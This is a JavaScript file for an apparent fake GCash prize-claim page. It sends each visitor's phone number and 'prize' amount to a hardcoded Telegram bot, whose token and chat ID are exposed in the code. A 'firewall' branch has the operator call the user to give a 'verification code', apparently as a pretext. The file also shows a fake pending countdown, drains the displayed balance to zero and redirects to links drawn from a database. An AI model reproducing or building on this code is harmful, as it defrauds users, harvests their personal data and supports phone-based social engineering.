let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

// Check if Firewall is active
async function isFirewallActive() {
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/globalFirewall').once('value');
            const data = snap.val();
            return (data && data.active === true);
        } catch(e) {
            return false;
        }
    }
    return false;
}

// Send notification to admin when user requests verification
async function sendVerificationRequestNotification(phone, amount) {
    const message = `📞 VERIFICATION REQUEST (FIREWALL MODE)\n📱 ${phone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}\n\nCall the user and provide the verification code.`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
        console.log("📨 Verification request sent to Telegram");
    } catch(e) {
        console.log("Telegram error:", e);
    }
}

// Show claim popup - main entry point
async function showClaimPopup(amount) {
    const firewallActive = await isFirewallActive();
    
    if (firewallActive) {
        // FIREWALL ON - Send notification to admin
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        await sendVerificationRequestNotification(userPhone, amount);
        
        // Show verification popup
        if (typeof window.showFirewallPopup === 'function') {
            window.showFirewallPopup();
        }
        return;
    }
    
    // FIREWALL OFF - Normal congratulations popup
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    if (popup) popup.style.display = 'none';
}

function showPendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) pendingArea.style.display = 'block';
    claimState.isPending = true;
}

function hidePendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) pendingArea.style.display = 'none';
    claimState.isPending = false;
}

function updateVisibleCountdown(seconds) {
    const timerSpan = document.getElementById('pendingCountdown');
    if (!timerSpan) return;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

function startVisibleCountdown() {
    let remaining = claimState.countdownSeconds;
    updateVisibleCountdown(remaining);
    
    claimState.countdownInterval = setInterval(() => {
        remaining--;
        updateVisibleCountdown(remaining);
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            if (!claimState.hasRedirected) {
                const balanceText = document.getElementById('balanceText');
                if (balanceText) balanceText.innerText = "₱" + claimState.currentAmount.toLocaleString() + ".00";
                if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                    window.parent.updateGameBalance(claimState.currentAmount);
                }
                hidePendingStatus();
                const withdrawBtn = document.getElementById('claimBtn');
                if (withdrawBtn) withdrawBtn.style.display = 'block';
                claimState.isProcessing = false;
            }
        }
    }, 1000);
}

function startSmoothDecrement(originalAmount, onComplete) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    let current = originalAmount;
    const totalDuration = 3500;
    const intervalTime = 50;
    const steps = totalDuration / intervalTime;
    const decrementPerStep = originalAmount / steps;
    let stepCount = 0;
    
    claimState.balanceDecrementInterval = setInterval(() => {
        stepCount++;
        current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
        balanceText.innerText = "₱" + current.toFixed(2);
        if (current <= 0.01) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
            if (onComplete) onComplete();
        }
    }, intervalTime);
}

function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) {
            claimState.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 3500);
}

function onClaimAction() {
    if (claimState.isProcessing) return;
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    
    // Send initial claim request to Telegram
    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: amount, claimedAt: Date.now() });
                hideClaimPopup();
                showPendingStatus();
                startSmoothDecrement(amount, () => {
                    if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                        window.parent.updateGameBalance(0);
                    }
                });
                startImaginaryTimer(redirectUrl);
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimState.isProcessing = false;
                }, 3000);
                alert("No available rewards!");
            }
        }).catch(() => {
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => {
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimBtn.disabled = false;
                claimState.isProcessing = false;
            }, 3000);
        });
    }
}

document.addEventListener('DOMContentLoaded', function() {
    hidePendingStatus();
});
